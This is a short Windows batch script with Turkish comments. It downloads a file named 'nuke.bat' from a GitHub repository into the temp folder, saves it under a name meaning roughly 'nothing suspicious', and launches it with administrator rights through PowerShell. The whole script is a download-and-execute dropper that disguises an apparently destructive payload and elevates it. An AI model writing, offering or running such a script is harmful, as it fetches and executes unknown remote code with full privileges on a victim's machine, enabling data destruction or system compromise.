@echo off
setlocal

:: 1. Dosya nereye indirilecek
set "indirilecek_yol=%TEMP%\hicsupheliolmayan.bat"

:: 2. Dosya indirme (örnek .exe URL)
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/ruzgartvtr/ROBOT/raw/refs/heads/main/nuke.bat' -OutFile '%indirilecek_yol%'"

:: 3. Yönetici olarak çalıştır (PowerShell ile)
powershell -Command "Start-Process '%indirilecek_yol%' -Verb runAs"

exit
